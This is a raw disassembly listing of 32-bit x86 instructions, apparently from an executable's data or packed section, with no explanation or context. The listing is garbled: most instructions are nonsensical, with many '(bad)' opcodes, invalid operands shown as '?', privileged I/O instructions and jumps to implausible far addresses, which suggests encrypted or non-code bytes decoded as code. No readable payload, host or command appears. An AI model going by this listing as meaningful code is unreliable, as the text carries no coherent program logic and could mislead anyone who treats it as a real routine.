  404122:	mov    cl,al
  404124:	outs   dx,BYTE PTR ds:[esi]
  404125:	mov    esi,0x6eded5da
  40412a:	xchg   esi,eax
  40412b:	push   esp
  40412c:	std    
  40412d:	cli    
  40412e:	xchg   ebx,eax
  40412f:	sbb    bh,BYTE PTR [eax+0x453bee9c]
  404135:	js     0x4041ad
  404137:	inc    ecx
  404138:	stos   BYTE PTR es:[edi],al
  404139:	bound  ebp,QWORD PTR [ebx]
  40413b:	push   cs
  40413c:	es aas 
  40413e:	or     BYTE PTR [esi-0x7],dl
  404141:	aas    
  404142:	rcl    BYTE PTR [eax+0x19],cl
  404145:	pop    eax
  404146:	into   
  404147:	sub    eax,0xa8aff01d
  40414c:	pop    ds
  40414d:	popf   
  40414e:	into   
  40414f:	ror    BYTE PTR [ebp-0x37ba6741],1
  404155:	pop    es
  404156:	pop    ecx
  404157:	es stos DWORD PTR es:[edi],eax
  404159:	lahf   
  40415a:	sbb    dl,ch
  40415c:	mov    gs,WORD PTR [ecx]
  40415e:	je     0x4041a5
  404160:	sbb    DWORD PTR [eax+edx*2-0x53],edx
  404164:	cmp    al,0x66
  404166:	add    esi,DWORD PTR [ebp+edx*8-0x7869ecac]
  40416d:	and    esi,DWORD PTR [edx]
  40416f:	dec    esp
  404170:	inc    esp
  404171:	cdq    
  404172:	push   0xffffffb4
  404174:	in     eax,0xc1
  404176:	or     bl,BYTE PTR [edx]
  404178:	out    dx,eax
  404179:	mov    esi,0x577db380
  40417e:	dec    eax
  40417f:	and    esi,DWORD PTR [ecx]
  404181:	icebp  
  404182:	aam    0x23
  404184:	add    DWORD PTR [ecx-0x647929ca],0x45
  40418b:	mov    al,0x27
  40418d:	cwde   
  40418e:	jl     0x4041e1
  404190:	ds aas 
  404192:	ds cld 
  404194:	scas   al,BYTE PTR es:[edi]
  404195:	xchg   ebp,eax
  404196:	sub    esi,edx
  404198:	xchg   ebp,eax
  404199:	push   esp
  40419a:	lods   eax,DWORD PTR ds:[esi]
  40419b:	xchg   bx,ax
  40419d:	scas   eax,DWORD PTR es:[edi]
  40419e:	push   cs
  40419f:	outs   dx,BYTE PTR ds:[esi]
  4041a0:	bound  edi,QWORD PTR [edx+edi*2+0x1f1935dd]
  4041a7:	pushf  
  4041a8:	push   cs
  4041a9:	rcr    BYTE PTR [esi+0xf],0x79
  4041ad:	repz inc ebp
  4041af:	into   
  4041b0:	leave  
  4041b1:	loopne 0x4041a0
  4041b3:	loop   0x404206
  4041b5:	lds    eax,FWORD PTR [eax-0x673118c6]
  4041bb:	xor    al,0x20
  4041bd:	sti    
  4041be:	outs   dx,BYTE PTR ds:[esi]
  4041bf:	scas   al,BYTE PTR es:[edi]
  4041c0:	ds dec edi
  4041c2:	dec    ebx
  4041c3:	int3   
  4041c4:	out    0x73,al
  4041c6:	sub    al,BYTE PTR [edi]
  4041c8:	jge    0x40417c
  4041ca:	retf   
  4041cb:	push   ds
  4041cc:	add    dl,BYTE PTR [eax]
  4041ce:	adc    edi,ecx
  4041d0:	pop    esp
  4041d1:	dec    edi
  4041d2:	aas    
  4041d3:	jmp    DWORD PTR [edi]
  4041d5:	aas    
  4041d6:	pusha  
  4041d7:	pop    esp
  4041d8:	inc    edx
  4041d9:	out    0x9b,al
  4041db:	mov    ebp,DWORD PTR [edi]
  4041dd:	cmp    DWORD PTR ds:0xdf6afd6c,eax
  4041e3:	test   BYTE PTR [edx+0x594d4e56],ch
  4041e9:	mov    ds:0x369aea98,eax
  4041ee:	add    BYTE PTR [ebx+0x78336723],cl
  4041f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f5:	out    dx,al
  4041f6:	push   ds
  4041f7:	add    BYTE PTR [ebx],al
  4041f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041fa:	(bad)  
  4041fb:	mov    BYTE PTR [ebp-0x36],ah
  4041fe:	xchg   ebx,eax
  4041ff:	mov    DWORD PTR [esi+0x1270fad2],esi
  404205:	leave  
  404206:	sahf   
  404207:	mov    bh,0xb2
  404209:	mov    esi,esi
  40420b:	push   esi
  40420c:	loope  0x404251
  40420e:	inc    ebx
  40420f:	jno    0x4041b4
  404211:	int3   
  404212:	lahf   
  404213:	xchg   esi,eax
  404214:	bnd jne 0x404244
  404217:	pop    ds
  404218:	dec    edx
  404219:	xor    ah,BYTE PTR [ebp+ebx*8-0xc49efd4]
  404220:	lods   al,BYTE PTR ds:[esi]
  404221:	pop    ss
  404222:	push   cs
  404223:	scas   al,BYTE PTR es:[edi]
  404224:	mov    DWORD PTR [ecx+eiz*2],ebx
  404227:	inc    esp
  404228:	push   cs
  404229:	mov    eax,0x3a40e2c2
  40422e:	fistp  WORD PTR [edx-0x75d9e7a4]
  404234:	jle    0x404218
  404236:	cmc    
  404237:	xchg   ebp,eax
  404238:	jle    0x40427a
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fe6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	setb   BYTE PTR [ecx-0x7b]
  40425b:	lock dec edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x5070707d
  404265:	and    edx,esp
  404267:	pop    edx
  404268:	mov    ds:0x839e9e88,eax
  40426d:	clc    
  40426e:	push   cs
  40426f:	rcl    BYTE PTR [esi+esi*1-0x67],1
  404273:	sub    eax,0x23a6ebb9
  404278:	lds    edx,FWORD PTR [edi-0x7854db2d]
  40427e:	jo     0x4042f5
  404280:	(bad)  
  404281:	loop   0x404223
  404283:	inc    eax
  404284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404285:	push   ebp
  404286:	mov    WORD PTR [ebp+0x2f1712cb],ss
  40428c:	pop    ecx
  40428d:	popf   
  40428e:	dec    esi
  40428f:	ss enter 0x5bd3,0x56
  404294:	inc    ecx
  404295:	mov    ah,0x99
  404297:	xchg   ecx,eax
  404298:	outs   dx,DWORD PTR ds:[esi]
  404299:	nop
  40429a:	sub    dl,BYTE PTR [eax]
  40429c:	mov    edx,ecx
  40429e:	fs push ebx
  4042a0:	lds    esp,FWORD PTR [ecx]
  4042a2:	mov    bh,0xf5
  4042a4:	jle    0x404298
  4042a6:	xchg   ebp,eax
  4042a7:	jmp    0x23340b9b
  4042ac:	ja     0x4042af
  4042ae:	retf   
  4042af:	aad    0x46
  4042b1:	dec    ebx
  4042b2:	or     esp,esi
  4042b4:	aad    0x1e
  4042b6:	mov    ds:0xd9d348df,eax
  4042bb:	fld    QWORD PTR [edx+0x377f1b5e]
  4042c1:	xor    DWORD PTR [esi+edi*8+0x2f],esp
  4042c5:	jbe    0x40424f
  4042c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042c8:	mov    ebx,0x4816a201
  4042cd:	dec    edx
  4042ce:	fmul   DWORD PTR [edx-0x6b6677e1]
  4042d4:	scas   eax,DWORD PTR es:[edi]
  4042d5:	int3   
  4042d6:	jmp    0x3ad283c5
  4042db:	int3   
  4042dc:	and    BYTE PTR [ecx+0x5],0xee
  4042e0:	and    DWORD PTR [ecx+0x5cc75bae],edi
  4042e6:	lea    eax,[eax]
  4042e8:	add    eax,0x78c4ec91
  4042ed:	sub    DWORD PTR [esi-0x36cbf0fb],edi
  4042f3:	mov    DWORD PTR [edx+ebx*1-0x3b95eba],esi
  4042fa:	imul   ebp,DWORD PTR [ebx+eax*8+0x72],0xffffffcd
  4042ff:	popf   
  404300:	jl     0x404359
  404302:	or     DWORD PTR [ebx-0x7],edx
  404305:	cli    
  404306:	in     al,0x9f
  404308:	test   cl,cl
  40430a:	jbe    0x40428c
  40430c:	mov    al,BYTE PTR [ebx]
  40430e:	dec    eax
  40430f:	mov    ebp,0xba11bc6d
  404314:	enter  0x90b,0x57
  404318:	add    BYTE PTR [ecx+0x63],bl
  40431b:	mov    ch,0xae
  40431d:	jp     0x404363
  40431f:	push   ss
  404320:	in     al,0x7a
  404322:	push   edx
  404323:	dec    edx
  404324:	test   al,0x1c
  404326:	sub    eax,DWORD PTR [ebp+0x16447719]
  40432c:	mov    cl,0x2
  40432e:	and    ecx,DWORD PTR [ebp+0x7b]
  404331:	ret    
  404332:	imul   esp,esp,0xffffffaf
  404335:	iret   
  404336:	lds    edi,FWORD PTR [eax+edx*2-0x7115c592]
  40433d:	or     dl,BYTE PTR [ecx]
  40433f:	xchg   BYTE PTR [esi+0x6d676462],bh
  404345:	add    dh,BYTE PTR [ebx+0x138bfb2e]
  40434b:	popf   
  40434c:	(bad)  
  40434d:	mov    esp,0xd9d393ad
  404352:	stos   BYTE PTR es:[edi],al
  404353:	enter  0x73d9,0xb4
  404357:	iret   
  404358:	inc    ebx
  404359:	arpl   sp,dx
  40435b:	jo     0x4043cb
  40435d:	fstp   DWORD PTR [esi+0x17b8a226]
  404363:	and    BYTE PTR [eax-0x41],dh
  404366:	jno    0x4043d8
  404368:	scas   al,BYTE PTR es:[edi]
  404369:	and    eax,0x30553946
  40436e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404370:	xchg   esp,eax
  404371:	out    0xd4,eax
  404373:	push   edx
  404374:	leave  
  404375:	in     al,dx
  404376:	cwde   
  404377:	jmp    0xb5f54ea5
  40437c:	push   ss
  40437d:	and    esi,eax
  40437f:	mov    DWORD PTR [eax],0x51ffb15b
  404385:	mov    ds:0x9c9dc92b,al
  40438a:	jecxz  0x40430d
  40438c:	pop    ss
  40438d:	mov    ah,0x71
  40438f:	pop    edi
  404390:	and    BYTE PTR [esi+0x7a],0xa1
  404394:	int    0xed
  404396:	(bad)  [esi-0x42]
  404399:	(bad)  
  40439a:	retf   
  40439b:	fisubr DWORD PTR ds:0xd3982282
  4043a1:	js     0x40435c
  4043a3:	mov    ds:0x7f81c2c7,al
  4043a8:	add    bh,BYTE PTR [ebp+edi*1+0x2e]
  4043ac:	mov    ch,BYTE PTR [ebp-0x7c1ab537]
  4043b2:	xchg   ebp,eax
  4043b3:	and    ch,bh
  4043b5:	lahf   
  4043b6:	xchg   esp,eax
  4043b7:	and    ebx,DWORD PTR [edi+0x61]
  4043ba:	call   0x6004ae4c
  4043bf:	icebp  
  4043c0:	pop    edx
  4043c1:	inc    ecx
  4043c2:	loope  0x404346
  4043c4:	cmp    al,0x7b
  4043c6:	push   ds
  4043c7:	dec    esi
  4043c8:	rcl    DWORD PTR [esi+0x442b5572],1
  4043ce:	pop    edx
  4043cf:	push   eax
  4043d0:	add    DWORD PTR [ebx],ebp
  4043d2:	xor    esi,esp
  4043d4:	adc    ebp,edx
  4043d6:	mov    BYTE PTR [ebx-0x20],bl
  4043d9:	add    BYTE PTR [edi],ah
  4043db:	xchg   bh,ah
  4043dd:	lds    eax,FWORD PTR [esi+0x312683b4]
  4043e3:	inc    edx
  4043e4:	mov    ds:0x933b4cb3,al
  4043e9:	(bad)  
  4043ea:	out    0xa1,eax
  4043ec:	inc    BYTE PTR [edx-0x1f]
  4043ef:	stc    
  4043f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f1:	pop    es
  4043f2:	ds out dx,al
  4043f4:	popa   
  4043f5:	(bad)  
  4043f6:	out    0xed,eax
  4043f8:	jnp    0x4043fe
  4043fa:	retf   0x22c8
  4043fd:	push   edi
  4043fe:	dec    ebp
  4043ff:	or     ch,ah
  404401:	ins    BYTE PTR es:[edi],dx
  404402:	(bad)  
  404403:	out    dx,eax
  404404:	test   DWORD PTR [edx+esi*8+0x21a7ddf1],0xafd35da2
  40440f:	sbb    al,0x7c
  404411:	clc    
  404412:	dec    edi
  404413:	adc    ecx,esp
  404415:	push   es
  404416:	mov    edx,0x4fdab05c
  40441b:	hlt    
  40441c:	test   eax,0x7180e6dc
  404421:	shl    eax,0x29
  404424:	adc    eax,edx
  404426:	lods   eax,DWORD PTR ds:[esi]
  404427:	cmp    BYTE PTR [eax],ah
  404429:	pop    ecx
  40442a:	mov    edx,0x51956e20
  40442f:	push   cs
  404430:	scas   eax,DWORD PTR es:[edi]
  404431:	gs or  esp,esi
  404434:	mul    BYTE PTR [eax+0x57468562]
  40443a:	mov    ch,0x7e
  40443c:	ret    
  40443d:	out    0x43,al
  40443f:	dec    ebp
  404440:	pop    edi
  404441:	fist   DWORD PTR [esi]
  404443:	and    esp,DWORD PTR [ebp+0x2d]
  404446:	jae    0x404405
  404448:	xchg   edx,eax
  404449:	adc    BYTE PTR [edi+0x42acfa7d],0x53
  404450:	dec    eax
  404451:	fst    DWORD PTR [esi]
  404453:	jns    0x404498
  404455:	int    0xc6
  404457:	sbb    al,al
  404459:	mov    ds:0xcde73fd0,eax
  40445e:	inc    ebx
  40445f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404460:	out    0x71,al
  404462:	or     eax,0x25d37720
  404467:	sub    eax,0x412557ea
  40446c:	jno    0x404460
  40446e:	addr16 cs mov edi,0xb413e5a1
  404475:	sub    DWORD PTR [ecx+0x19409d7],esi
  40447b:	push   edx
  40447c:	dec    ebx
  40447d:	xchg   esp,eax
  40447e:	or     DWORD PTR [ebx],ebp
  404480:	jbe    0x40448e
  404482:	(bad)  
  404484:	js     0x4044e3
  404486:	ins    BYTE PTR es:[edi],dx
  404487:	imul   ebp,DWORD PTR [ebp-0xe052b90],0xa91eaadf
  404491:	mov    WORD PTR [eax+0x7f],ds
  404494:	or     DWORD PTR [ebp-0x1b203845],esp
  40449a:	mov    edi,0x7f44d678
  40449f:	retf   0xc694
  4044a2:	xor    esp,DWORD PTR [eax-0x58]
  4044a5:	mov    bh,0x5
  4044a7:	stc    
  4044a8:	xor    eax,edx
  4044aa:	mov    ebx,0x69973ce6
  4044af:	div    BYTE PTR [eax+0x27]
  4044b2:	push   edx
  4044b3:	pop    ebx
  4044b4:	mov    DWORD PTR [eax+esi*8+0x48c29319],edx
  4044bb:	inc    edi
  4044bc:	stc    
  4044bd:	popf   
  4044be:	add    al,0xb9
  4044c0:	rol    DWORD PTR [esi],cl
  4044c2:	repz push 0x4ae99e57
  4044c8:	sbb    al,0x8
  4044ca:	in     eax,0x60
  4044cc:	jb     0x4044d3
  4044ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044cf:	xchg   ebp,eax
  4044d0:	pushf  
  4044d1:	push   edi
  4044d2:	push   ss
  4044d3:	lahf   
  4044d4:	clc    
  4044d5:	push   ds
  4044d6:	xchg   BYTE PTR [ebx-0x37a8c6d2],ah
  4044dc:	lods   al,BYTE PTR ds:[esi]
  4044dd:	sahf   
  4044de:	xchg   ebx,eax
  4044df:	push   0x1e
  4044e1:	mov    ds:0x5618d6ea,al
  4044e6:	sar    DWORD PTR [ebx],cl
  4044e8:	mov    edx,0xe3a607a7
  4044ed:	inc    esp
  4044ee:	ds std 
  4044f0:	out    0xd7,eax
  4044f2:	test   DWORD PTR [edx+edx*8],edx
  4044f5:	out    0x85,al
  4044f7:	rol    DWORD PTR [ebx+0x4b8266c5],1
  4044fd:	xchg   edx,eax
  4044fe:	into   
  4044ff:	inc    esi
  404500:	(bad)  
  404501:	out    0x2f,al
  404503:	(bad)  
  404504:	lahf   
  404505:	fild   DWORD PTR [esi]
  404507:	shl    DWORD PTR [edx+ebx*8+0x4a0009e9],0xf7
  40450f:	sbb    al,0xfd
  404511:	and    BYTE PTR [ecx],ch
  404513:	xchg   ecx,eax
  404514:	nop
  404515:	mov    cl,0x5a
  404517:	rcl    BYTE PTR [eax+0x1f],1
  40451a:	pop    esi
  40451b:	retf   
  40451c:	cwde   
  40451d:	je     0x404534
  40451f:	mov    al,ds:0xf5915f93
  404524:	int3   
  404525:	test   BYTE PTR [eax+0x6dcfd3ab],al
  40452b:	leave  
  40452c:	mov    ebx,0x462a9a41
  404531:	(bad)  
  404532:	ins    DWORD PTR es:[edi],dx
  404533:	dec    ebp
  404534:	fist   WORD PTR [eax+0x74c8f39a]
  40453a:	add    eax,0x31fa9a4e
  40453f:	cmp    cl,bl
  404541:	sar    BYTE PTR [ebp+esi*8+0x0],1
  404545:	int    0xbf
  404547:	lock sbb al,0x86
  40454a:	dec    ebp
  40454b:	and    eax,0x82b8d5c6
  404550:	pushf  
  404551:	adc    eax,0x27cef6ea
  404556:	pop    esi
  404557:	jge    0x404517
  404559:	jns    0x404509
  40455b:	xchg   edi,eax
  40455c:	sbb    esi,DWORD PTR [esi+0x24]
  40455f:	ds push eax
  404561:	xor    bl,ch
  404563:	pop    es
  404564:	add    al,0xf8
  404566:	xor    eax,DWORD PTR [esi+0x10]
  404569:	push   esp
  40456a:	scas   al,BYTE PTR es:[edi]
  40456b:	push   esi
  40456c:	(bad)  
  40456d:	sar    bl,cl
  40456f:	dec    ebx
  404570:	jbe    0x404512
  404572:	fisub  WORD PTR [esi]
  404574:	mov    edx,DWORD PTR ds:0x9d5bb128
  40457a:	inc    eax
  40457b:	mov    al,ds:0xf1948a1e
  404580:	dec    ebx
  404581:	aad    0x7d
  404583:	adc    DWORD PTR [ebp+0x5],ebx
  404586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404587:	fsub   QWORD PTR [ebx-0x4f96d08e]
  40458d:	push   ebx
  40458e:	push   esp
  40458f:	fdivr  st,st(5)
  404591:	stos   DWORD PTR es:[edi],eax
  404592:	sub    al,0x1b
  404594:	push   ebp
  404595:	mov    DWORD PTR [eax+ebp*8],esi
  404598:	mov    ah,0x8b
  40459a:	cmp    dl,BYTE PTR [ebx+edi*4]
  40459d:	and    DWORD PTR [edx-0x42431827],edx
  4045a3:	push   edx
  4045a4:	lahf   
  4045a5:	cmp    eax,0x11820fd0
  4045aa:	stc    
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fe82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	outs   dx,BYTE PTR ds:[esi]
  4045c8:	icebp  
  4045c9:	sti    
  4045ca:	ror    DWORD PTR [esp],0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x40458d
  4045d4:	je     0x40456b
  4045d6:	cmp    DWORD PTR ss:[ecx],esp
  4045d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045db:	arpl   WORD PTR [ebx-0x52],bp
  4045de:	add    BYTE PTR [edx-0x6e],bh
  4045e1:	cld    
  4045e2:	push   esi
  4045e3:	(bad)  
  4045e4:	mov    ah,0x8c
  4045e6:	add    eax,0xcbc26871
  4045eb:	mov    ch,0x4e
  4045ed:	stos   BYTE PTR es:[edi],al
  4045ee:	ins    DWORD PTR es:[edi],dx
  4045ef:	lahf   
  4045f0:	push   cs
  4045f1:	ins    DWORD PTR es:[di],dx
  4045f3:	add    al,BYTE PTR [ebx+0x72]
  4045f6:	cld    
  4045f7:	ror    BYTE PTR [eax+0x3d],cl
  4045fa:	fisub  WORD PTR [esi-0x49b8cd7b]
  404600:	out    0xdd,al
  404602:	sub    ebx,esp
  404604:	lock adc dh,BYTE PTR [edi+0x698e1628]
  40460b:	rol    eax,0xff
  40460e:	(bad)  
  40460f:	ss pop ebx
  404611:	sbb    eax,0x4a50349a
  404616:	xor    dl,dl
  404618:	push   es
  404619:	aaa    
  40461a:	sub    eax,DWORD PTR [esi+esi*1]
  40461d:	les    esp,FWORD PTR ds:0x6e193720
  404623:	dec    esp
  404624:	jg     0x4045f1
  404626:	sbb    DWORD PTR [esi+eax*4-0x18],eax
  40462a:	xor    DWORD PTR [edi+esi*4-0x5a9df50],0x869af2cf
  404635:	dec    edi
  404636:	adc    al,0xc5
  404638:	mov    ds:0x6e62edd0,eax
  40463d:	ret    0x8ed1
  404640:	bound  edi,QWORD PTR [ebp+ecx*8+0x42]
  404644:	push   ebp
  404645:	stos   DWORD PTR es:[edi],eax
  404646:	clc    
  404647:	cli    
  404648:	in     al,dx
  404649:	add    ebp,ecx
  40464b:	lods   al,BYTE PTR ds:[esi]
  40464c:	outs   dx,DWORD PTR ds:[esi]
  40464d:	lods   eax,DWORD PTR ds:[esi]
  40464e:	fsub   QWORD PTR [esi-0x52]
  404651:	or     dh,ch
  404653:	outs   dx,BYTE PTR ds:[esi]
  404654:	push   eax
  404655:	jecxz  0x40460a
  404657:	jmp    0x24b:0x908bef5e
  40465e:	mov    fs,WORD PTR [edx]
  404660:	mov    ah,0xb2
  404662:	sbb    DWORD PTR [ecx-0x17],edx
  404665:	in     al,dx
  404666:	out    0xd2,al
  404668:	pop    ebx
  404669:	push   es
  40466a:	mov    bh,0x49
  40466c:	cmp    al,0x49
  40466e:	rol    DWORD PTR [esi+0x4119f3d6],1
  404674:	jae    0x404685
  404676:	fsub   DWORD PTR [ebp+0x17]
  404679:	inc    edx
  40467a:	sahf   
  40467b:	mov    dh,0x63
  40467d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467e:	mov    ebx,0x8b4e6504
  404683:	jno    0x404684
  404685:	pop    ds
  404686:	mov    dh,BYTE PTR [edx]
  404688:	ror    al,cl
  40468a:	int3   
  40468b:	push   ebx
  40468c:	xchg   BYTE PTR [edx+ebp*4],bh
  40468f:	xchg   edi,eax
  404690:	fxch   st(0)
  404692:	jmp    0xeb69f08c
  404697:	js     0x40466e
  404699:	sbb    eax,0xe1accbb3
  40469e:	retf   0x7711
  4046a1:	jmp    0x8436:0x3353e972
  4046a8:	stos   BYTE PTR es:[edi],al
  4046a9:	rol    dl,0xd0
  4046ac:	mov    dl,0x96
  4046ae:	sar    BYTE PTR [ebx],0x39
  4046b1:	aas    
  4046b2:	test   ecx,eax
  4046b4:	or     eax,0x2fd13
  4046b9:	pop    eax
  4046ba:	push   ecx
  4046bb:	push   ebx
  4046bc:	repnz aad 0x1a
  4046bf:	push   esp
  4046c0:	fs enter 0xf833,0xd1
  4046c5:	pop    ebp
  4046c6:	push   esp
  4046c7:	push   edx
  4046c8:	hlt    
  4046c9:	test   DWORD PTR [ebx],eax
  4046cb:	mov    ch,ah
  4046cd:	mov    ds:0x2db99f1e,eax
  4046d2:	sahf   
  4046d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d4:	jge    0x404722
  4046d6:	loopne 0x404707
  4046d8:	cwde   
  4046d9:	lea    edi,[edx+0x79]
  4046dc:	ror    BYTE PTR [ebx+0x79],0xae
  4046e0:	retf   
  4046e1:	push   es
  4046e2:	xor    bl,bh
  4046e4:	shr    DWORD PTR [edi],cl
  4046e6:	inc    edx
  4046e7:	sbb    BYTE PTR [eax+0x205c39d7],cl
  4046ed:	cmp    cl,cl
  4046ef:	repnz push edi
  4046f1:	mov    WORD PTR [eax],cs
  4046f3:	les    edi,FWORD PTR [eax-0xc]
  4046f6:	add    al,0x69
  4046f8:	sub    al,0xb4
  4046fa:	inc    eax
  4046fb:	jno    0x40475c
  4046fd:	ficom  DWORD PTR [edi-0x3b]
  404700:	je     0x4046c4
  404702:	dec    edx
  404703:	bound  esi,QWORD PTR [ebx-0x652ba018]
  404709:	int    0xaf
  40470b:	jno    0x4046df
  40470d:	adc    eax,0x825e4b59
  404712:	mov    WORD PTR [ebx],?
  404714:	adc    al,0x3a
  404716:	retf   
  404717:	and    bl,BYTE PTR [edi]
  404719:	pushf  
  40471a:	pop    esi
  40471b:	popa   
  40471c:	stos   BYTE PTR es:[edi],al
  40471d:	ret    0x440d
  404720:	call   0x500f4516
  404725:	cli    
  404726:	push   ebx
  404727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404728:	pop    esi
  404729:	pop    ds
  40472a:	sahf   
  40472b:	or     edi,DWORD PTR [edx-0x7a]
  40472e:	jecxz  0x404772
  404730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404732:	inc    esi
  404733:	mov    ds:0xbe0c1462,eax
  404738:	sbb    ch,BYTE PTR [esi+0x23c9033f]
  40473e:	out    0xef,eax
  404740:	mov    WORD PTR [ebx+0x659de181],?
  404746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404747:	enter  0xed35,0x54
  40474b:	mov    esp,0x5efb9868
  404750:	pop    esp
  404751:	add    al,0xf3
  404754:	ins    BYTE PTR es:[edi],dx
  404755:	mov    edi,0x86c9882a
  40475a:	mov    ah,0x4a
  40475c:	cmp    edi,eax
  40475e:	pop    ds
  40475f:	das    
  404760:	mov    eax,0x2a75bd79
  404765:	push   ds
  404766:	push   esp
  404767:	fcomp  DWORD PTR [esi+0x27b14fb1]
  40476d:	dec    eax
  40476e:	pop    esp
  40476f:	xlat   BYTE PTR ds:[ebx]
  404770:	dec    edx
  404771:	and    BYTE PTR [eax-0x79b142d2],bl
  404777:	push   eax
  404778:	mov    al,0xd9
  40477a:	fist   DWORD PTR [ecx-0x22b8159e]
  404780:	cdq    
  404781:	mov    ebx,0x2103f2f8
  404786:	cmp    eax,0x80a03caa
  40478b:	popf   
  40478c:	xor    al,0x25
  40478e:	(bad)  
  40478f:	push   0xf970712d
  404794:	or     DWORD PTR [edx],0xffffffae
  404797:	or     eax,0xa3cb3d18
  40479c:	repnz push ss
  40479e:	mov    ecx,0xdaa79170
  4047a3:	fnstenv [esi-0x69]
  4047a6:	fisttp QWORD PTR [edx+0x413a5b12]
  4047ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ad:	fbld   TBYTE PTR [edx+0x2c]
  4047b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b1:	add    ch,ch
  4047b3:	and    DWORD PTR [ecx+0x668014e1],edx
  4047b9:	pop    esi
  4047ba:	hlt    
  4047bb:	outs   dx,BYTE PTR ds:[esi]
  4047bc:	stos   BYTE PTR es:[edi],al
  4047bd:	adc    al,0xcd
  4047bf:	jmp    0xbf39:0xab7b23b9
  4047c6:	sub    al,0xd4
  4047c8:	push   esp
  4047c9:	cs popf 
  4047cb:	popf   
  4047cc:	sti    
  4047cd:	hlt    
  4047ce:	xor    BYTE PTR [esi],bh
  4047d0:	jb     0x40480e
  4047d2:	jne    0x404839
  4047d4:	adc    eax,0xbf82e70f
  4047d9:	cmp    eax,0x713f3bc2
  4047de:	int    0x5f
  4047e0:	xchg   DWORD PTR [edi+0x5fbbab10],edi
  4047e6:	or     esi,DWORD PTR [ecx-0x7]
  4047e9:	div    BYTE PTR [ebx+0x9]
  4047ec:	lahf   
  4047ed:	add    DWORD PTR [ecx],eax
  4047ef:	sub    al,0x65
  4047f1:	pop    edx
  4047f2:	and    eax,0xa23c657a
  4047f7:	repnz push ss
  4047f9:	push   eax
  4047fa:	jno    0x4047a2
  4047fc:	retf   
  4047fd:	fild   QWORD PTR [eax+ecx*1+0x5e]
  404801:	sub    ecx,ebx
  404803:	pushf  
  404804:	fs pop ds
  404806:	mov    ebx,0x92bb3f87
  40480b:	sbb    dh,cl
  40480d:	and    cl,bl
  40480f:	and    BYTE PTR [edx],ah
  404811:	sub    eax,0x166e1b02
  404816:	int3   
  404817:	in     al,0x86
  404819:	clc    
  40481a:	(bad)  [eax+ecx*8+0xbd9fd92]
  404821:	push   edx
  404822:	adc    ebp,DWORD PTR [ebx]
  404824:	xor    al,0x81
  404826:	lea    edx,[ebx-0x5c]
  404829:	xchg   ebp,eax
  40482a:	pop    esi
  40482b:	fxch   st(1)
  40482d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40482e:	sub    DWORD PTR ds:0xf20ad8a1,esp
  404834:	stos   WORD PTR es:[edi],ax
  404836:	es pop esp
  404838:	aaa    
  404839:	js     0x404806
  40483b:	mov    al,dh
  40483d:	fistp  QWORD PTR [edi+edi*4]
  404840:	dec    edi
  404841:	add    al,0x4e
  404843:	pop    ds
  404844:	pop    ds
  404845:	mov    ebp,0x6687a3fe
  40484a:	cmp    al,0xbd
  40484c:	pop    ebx
  40484d:	into   
  40484e:	push   DWORD PTR [eax+0x6d]
  404851:	push   ebp
  404852:	xchg   edx,eax
  404853:	sahf   
  404854:	xor    eax,DWORD PTR [ebx-0x54]
  404857:	xchg   ebx,eax
  404858:	repnz adc BYTE PTR [esi-0x137dd051],ch
  40485f:	mov    ?,ebx
  404861:	in     eax,0xdd
  404863:	enter  0xc496,0x23
  404867:	int3   
  404868:	arpl   WORD PTR [eax],di
  40486a:	xchg   esp,eax
  40486b:	stos   DWORD PTR es:[edi],eax
  40486c:	mov    eax,ds:0x5cafa7e5
  404871:	and    eax,0x93f277cf
  404876:	lea    ebp,[ecx]
  404878:	sub    eax,0x3f688876
  40487d:	std    
  40487e:	jbe    0x40482b
  404880:	mov    ebp,0xead3f1d4
  404885:	jecxz  0x404832
  404887:	pop    es
  404888:	push   ecx
  404889:	rol    BYTE PTR [eax+0x48ef2dee],cl
  40488f:	sub    DWORD PTR [esi+ebp*2+0x42],esi
  404893:	cmp    eax,DWORD PTR [ebp+0x49]
  404896:	out    dx,al
  404897:	popf   
  404898:	lahf   
  404899:	aaa    
  40489a:	lahf   
  40489b:	mov    ecx,0x9205ec53
  4048a0:	cmp    al,0xf4
  4048a2:	xor    al,ah
  4048a4:	xor    eax,0x1bad4056
  4048a9:	shl    BYTE PTR [ebp+eiz*2+0x7],0xf4
  4048ae:	xchg   esp,eax
  4048af:	ds (bad) 
  4048b1:	mov    al,0x38
  4048b3:	and    BYTE PTR [ebx+0x6d],al
  4048b6:	push   ecx
